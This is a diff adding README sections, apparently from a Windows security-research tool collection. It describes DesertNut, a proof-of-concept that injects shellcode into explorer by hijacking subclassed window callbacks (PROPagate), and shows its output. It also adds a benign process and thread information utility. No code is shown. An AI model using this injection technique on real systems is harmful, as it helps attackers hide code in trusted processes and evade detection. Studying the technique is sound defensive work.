@@ -48,3 +48,137 @@ C:\>SwampThing.exe -l C:\Windows\System32\notepad.exe -f C:\aaa.txt -r C:\bbb.tx
 [+] pRTL_USER_PROCESS_PARAMETERS  : 0x20DA9870FE0
 [?] Success rewrote Len, MaxLen, Buffer..
 ```
+
+### DesertNut
+
+DesertNut is a proof-of-concept for code injection using subclassed window callbacks (more commonly known as PROPagate). The pertinent part here is that this does not use any suspect thread creation API's, instead as implied it hijacks window callbacks. DesertNut includes two flags: "-l" to list all potential properties that could be hijacked and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10 RS5 & Win7) since it requires custom shellcode with a specific callback function prototype. For further details please see [this post](http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/) by Hexacorn and [this post](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/) by modexp.
+
+```
+C:\> DesertNut.exe -i
+           ,                        '           .        '        ,
+   .            .        '       .         ,
+                                                   .       '     +
+       +          .-'''''-.
+                .'         `.   +     .     ________||
+       ___     :             :     |       /        ||  .     '___
+  ____/   \   :               :   ||.    _/      || ||\_______/   \
+ /         \  :      _/|      :   `|| __/      ,.|| ||             \
+/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
+    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
+   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
+ ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
+           _/~  `''~`'` \_           ''(       ....,||/       '
+ ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
+              '`  `\   \  \-.\        /(_1_,..      || /
+                                            ______/''''
+
+[+] Searching for Subclass property..
+[>] PID: 10928, ImageName: explorer
+    |-> ParentClassName: Progman, ChildClassName: SHELLDLL_DefView
+[+] Duplicating Subclass header..
+[>] hProc: 0x378
+[>] hProperty: 0x6B14DD0
+    |-> uRefs: 2, uAlloc: 3, uCleanup: 0
+    |-> dwThreadId: 5804, pFrameCur: 0
+    |-> pfnSubclass: 0x7FFA20E42280 --> comctl32!CallOriginalWndProc (?)
+    |-> uIdSubclass: 0, dwRefData: 0x7FFA2E4C07D0
+[+] Allocating remote shellcode..
+    |-> Sc Len: 344
+    |-> Sc Address: 0x3220000
+[+] Rewriting local SUBCLASS_HEADER..
+[+] Allocating remote SUBCLASS_HEADER..
+    |-> Subclass header Len: 48
+    |-> Subclass header Address: 0x3260000
+[+] Updating original UxSubclassInfo subclass procedure..
+[+] Trigger remote shellcode --> notepad..
+[+] Restoring original UxSubclassInfo subclass procedure..
+[+] Freeing remote SUBCLASS_HEADER & shellcode..
+
+C:\> DesertNut.exe -l
+           ,                        '           .        '        ,
+   .            .        '       .         ,
+                                                   .       '     +
+       +          .-'''''-.
+                .'         `.   +     .     ________||
+       ___     :             :     |       /        ||  .     '___
+  ____/   \   :               :   ||.    _/      || ||\_______/   \
+ /         \  :      _/|      :   `|| __/      ,.|| ||             \
+/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
+    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
+   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
+ ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
+           _/~  `''~`'` \_           ''(       ....,||/       '
+ ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
+              '`  `\   \  \-.\        /(_1_,..      || /
+                                            ______/''''
+
+
+[+] Subclassed Window Properties
+[>] PID: 10928, ImageName: explorer
+    |-> hProperty: 0x1BC84BF0, hParentWnd: 0xA0710, hChildWnd: 0x100650
+    |-> ParentClassName: Shell_TrayWnd, ChildClassName: Start
+
+[>] PID: 10928, ImageName: explorer
+    |-> hProperty: 0x1BC84C70, hParentWnd: 0xA0710, hChildWnd: 0x1C064C
+    |-> ParentClassName: Shell_TrayWnd, ChildClassName: TrayDummySearchControl
+
+[>] PID: 10928, ImageName: explorer
+    |-> hProperty: 0x12A64F0, hParentWnd: 0x1C064C, hChildWnd: 0x800E8
+    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Button
+
+[>] PID: 10928, ImageName: explorer
+    |-> hProperty: 0x12A58F0, hParentWnd: 0x1C064C, hChildWnd: 0x1504A4
+    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Static
+
+[>] PID: 10928, ImageName: explorer
+    |-> hProperty: 0x12A5870, hParentWnd: 0x1C064C, hChildWnd: 0x110814
+    |-> ParentClassName: TrayDummySearchControl, ChildClassName: ToolbarWindow32
+
+[...Snipped...]
+```
+
+## Windows API
+
+### SystemProcessAndThreadsInformation
+
+While working on a side project I had to access out-of-process thread information, to do this I used NtQuerySystemInformation -> SystemProcessAndThreadInformation. As it may be helpful for reference I wrote a small wrapper round this function to list process and thread information for a specific PID. Note that I am not extracting all available information from SYSTEM_PROCESSES and SYSTEM_THREAD_INFORMATION, feel free to extend the output with a pull request.
+
+```
+C:\> SystemProcessAndThreadsInformation.exe -p 4508
+
+[+] Process Details
+    ImageName           : powershell.exe
+    ProcessId           : 4508
+    ParentPid           : 8256
+    HandleCount         : 701
+    ThreadCount         : 25
+    SessionId           : 1
+    Priority            : 8
+    CreateTime          : 0d:22h:0m:31s:876ms
+    UserTime            : 0d:0h:0m:0s:328ms
+    KernelTime          : 0d:0h:0m:0s:281ms
+    WorkingSetSize      : 73.52734375 MB
+    PeakWorkingSetSize  : 73.5859375 MB
+    PageFaultCount      : 26896
+
+[+] Thread Details
+[>] TID: 9832, Priority: 9
+    |-> StartAddress: 0x7FFB84833670
+    |-> Created: 0d:22h:0m:31s:876ms, uTime: 0d:0h:0m:0s:46ms, kTime: 0d:0h:0m:0s:93ms
+    |-> WaitTime: 5843708, WaitReason: UserRequest
+    |-> State: Wait, ContextSwitches: 232
+
+[>] TID: 5552, Priority: 8
+    |-> StartAddress: 0x7FFB84833670
+    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:15ms
+    |-> WaitTime: 5843460, WaitReason: WrQueue
+    |-> State: Wait, ContextSwitches: 38
+
+[>] TID: 15716, Priority: 8
+    |-> StartAddress: 0x7FFB84833670
+    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:0ms
+    |-> WaitTime: 5843460, WaitReason: WrQueue
+    |-> State: Wait, ContextSwitches: 30
+
+[...Snipped...]
+```
